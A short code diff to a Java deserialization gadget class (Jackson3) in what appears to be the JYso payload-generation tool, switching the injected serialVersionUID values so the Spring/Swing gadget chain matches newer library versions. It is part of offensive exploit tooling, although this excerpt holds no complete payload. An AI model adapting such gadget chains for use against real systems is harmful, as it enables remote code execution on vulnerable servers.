@@ -6,8 +6,6 @@ import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.SuClassLoader;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 
-import javassist.ClassClassPath;
-
 import org.springframework.aop.framework.AdvisedSupport;
 
 import javassist.ClassPool;
@@ -24,7 +22,6 @@ import java.lang.reflect.*;
 
 import java.util.Vector;
 
-import static com.qi4l.JYso.gadgets.Config.Config.POOL;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 
 
@@ -38,7 +35,7 @@ public class Jackson3 implements ObjectPayload<Object> {
 
         //<=6.0.23为6115154060221772279
         //>=6.1.0 为273003553246259276
-        String sUID = "6115154060221772279";
+        String sUID = "273003553246259276";
         CtClass ctDefaultAdvisorChainFactory = insertField(
                 "org.springframework.aop.framework.DefaultAdvisorChainFactory",
                 "private static final long serialVersionUID = " + sUID + "L;");
@@ -57,16 +54,18 @@ public class Jackson3 implements ObjectPayload<Object> {
     public static Object getEventListenerList(Object obj) throws Exception {
         //>=6.1.0 为-7977902244297240866
         //<=6.0.23为-5677132037850737084
+        String sUID1 = "7977902244297240866";
         CtClass ctEventListenerList = insertField(
                 "javax.swing.event.EventListenerList",
-                "private static final long serialVersionUID = -5677132037850737084;");
+                "private static final long serialVersionUID = -" + sUID1 + "L;");
         Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();
 
         //>=6.1.0 为-1045223116463488483
         //<=6.0.23为-2077529998244066750
+        String sUID2 = "1045223116463488483";
         CtClass ctUndoManager = insertField(
                 "javax.swing.undo.UndoManager",
-                "private static final long serialVersionUID = -2077529998244066750L;");
+                "private static final long serialVersionUID = -" + sUID2 + "L;");
         Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();
 
         //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
